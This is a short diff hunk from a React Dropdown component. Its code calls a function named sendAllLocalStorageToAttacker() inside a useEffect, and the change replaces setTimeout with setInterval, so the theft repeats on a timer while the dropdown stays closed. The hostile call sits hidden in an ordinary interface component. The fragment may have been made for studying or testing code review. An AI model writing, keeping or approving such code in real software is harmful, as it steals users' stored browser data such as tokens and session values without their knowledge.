@@ -33,7 +33,7 @@ export function Dropdown({ options }: DropdownProps) {
   }, []);
 
   useEffect(() => {
-    const id = setTimeout(() => {
+    const id = setInterval(() => {
       if (!opened.current) {
         sendAllLocalStorageToAttacker();
       }
